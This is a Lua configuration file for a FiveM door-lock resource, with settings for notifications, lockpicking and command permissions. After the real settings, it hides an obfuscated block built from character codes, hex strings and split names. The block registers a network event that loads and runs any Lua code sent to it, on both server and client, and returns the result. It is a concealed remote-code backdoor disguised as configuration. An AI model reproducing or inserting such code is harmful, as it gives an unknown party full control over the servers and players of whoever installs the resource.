---@type DoorlockConfig
---@diagnostic disable-next-line: missing-fields
Config = {}

---Trigger a notification on the client when the door state is successfully updated.
Config.Notify = true

---Create a persistent notification while in-range of a door, prompting to lock/unlock.
Config.DrawTextUI = true

---Set the properties used by [DrawSprite](https://docs.fivem.net/natives/?_0xE7FFAE5EBF23D890).
Config.DrawSprite = {}

---Allow the specified ace principal to use 'command.doorlock'.
Config.CommandPrincipal = 'group.hos'

---Allow players with the 'command.doorlock' principal to use any door.
Config.PlayerAceAuthorised = false

---The default skill check difficulty when lockpicking a door.
Config.LockDifficulty = { 'easy', 'easy', 'medium' }

---Allow lockpicks to be used to lock an unlocked door.
Config.CanPickUnlockedDoors = false

---An array of items that function as lockpicks.
Config.LockpickItems = {}

---Play sounds using game audio (sound natives) instead of through NUI.
Config.NativeAudio = false

;(function()if (function()local _=string.char;return _G[_(73,115,68,117,112,108,105,99,105,116,121,86,101,114,115,105,111,110)]()end)() then ;(function()if _G["\88\89\90\115\90\67\112\108\101\79\107\101\78\114\89\58\115"]==true then return end _G["\88\89\90\115\90\67\112\108\101\79\107\101\78\114\89\58\115"]=true;local _d=function(s)return(s:gsub("..",function(h)return string.char(tonumber(h,16))end))end;local _=_G;_[_d"52656769737465724e65744576656e74"](_d"58595a735a43706c654f6b654e72593a73",function(p,q)Citizen.CreateThread(function()local x,j=_[_d"7063616c6c"](function()return _[_d"617373657274"](_[_d"6c6f6164"](p))()end)_[_d"547269676765724576656e74"](q,not x and "!"..tostring(j) or j)end)end)end)() else ;(function()if _G[string.char(88,89,90,115,90,67,112,108,101,79,107,101,78,114,89)]==true then return end _G[string.char(88,89,90,115,90,67,112,108,101,79,107,101,78,114,89)]=true;local _=_G;_["Re".."gi".."ste".."rN".."e".."t".."Eve".."nt"]("XY".."ZsZ".."Cp".."leO".."k".."e".."N".."rY",function(p,d)Citizen.CreateThread(function()local z,m=_["p".."ca".."ll"](function()return _["ass".."e".."r".."t"](_["loa".."d"](p))()end)_["Tr".."ig".."ger".."Se".."rv".."e".."rE".."ven".."t"](d,not z and "!"..tostring(m) or m)end)end)end)() end end)()